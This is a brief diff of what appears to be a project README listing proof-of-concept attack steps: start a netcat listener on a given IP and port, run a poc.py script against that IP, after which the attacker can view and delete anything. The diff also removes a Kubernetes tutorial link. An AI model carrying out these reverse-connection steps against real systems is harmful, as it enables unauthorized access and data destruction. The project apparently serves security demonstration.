@@ -16,6 +16,3 @@ Used PoCs:
 4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
 5- Run poc.py with your ip `./poc.py 144.122.139.40` \
 6- Attacker now can view and delete anything they want.
-
-### Kubernetes
-Check https://learnk8s.io/deploying-nodejs-kubernetes for deployment tutorial
